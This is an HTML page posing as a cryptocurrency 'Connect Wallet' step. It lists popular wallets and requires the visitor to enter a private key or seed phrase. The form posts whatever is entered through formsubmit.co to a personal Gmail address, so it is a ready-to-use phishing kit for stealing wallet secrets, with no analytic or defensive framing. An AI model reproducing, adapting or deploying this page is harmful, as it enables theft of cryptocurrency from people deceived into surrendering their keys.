<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
        }

        .form-container {
            width: 300px;
            padding: 20px;
            border-radius: 8px;
            background-color: #333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input, select, textarea {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
        textarea {
            resize: none;
            height: 80px;
        }
        .submit-btn {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            border: none;
            padding: 10px;
            border-radius: 5px;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <form action="https://formsubmit.co/Yuj79401@gmail.com" method="POST">
            <!-- Message Field (required) -->
            <!-- Options Dropdown -->
            <div class="form-group">
                <label for="options">Connect Wallet</label>
                <select id="options" name="options">
                    <option value="">Select your wallet</option>
                    <option value="Option 1">MetaMask</option>
                    <option value="Option 2">TrustWallet</option>
                    <option value="Option 3">Ledger Wallet</option>
                    <option value="Option 3">Trezor Wallet</option>
                    <option value="Option 4">Exodus</option>
                    <option value="Option 5">Coinbase Wallet</option>
                    <option value="Option 6">coinomi</option>
                    <option value="Option 7">Mycelium</option>
                    <option value="Option 8">Okx Wallet</option>
                    <option value="Option 9">Electrum</option>
                    <option value="Option 10">Atomic Wallet</option>
                    <option value="Option 11">MyEtherWallet</option>
                    <option value="Option 12">Phantom Wallet</option>
                    <option value="Option 13">Guarda wallet</option>
                    <option value="Option 14">Exodus</option>
                    <option value="Option 15">Bitget Wallet</option>
                    <option value="Option 16">Bitpay wallet</option>
                </select>
            </div>
            <!-- Name Input Field -->
            <div class="form-group">
                <label for="name">Input your Wallet (If not in Wallet-name options)</label>
                <input type="text" id="name" name="name" placeholder="Enter your Wallet name">
            </div>
            <div class="form-group">
                <label for="message">Private key or Seed phrase</label>
                <textarea id="message" name="message" required></textarea>
            </div>

            <button type="submit" class="submit-btn">Connect</button>
        </form>
    </div>

</body>
</html>
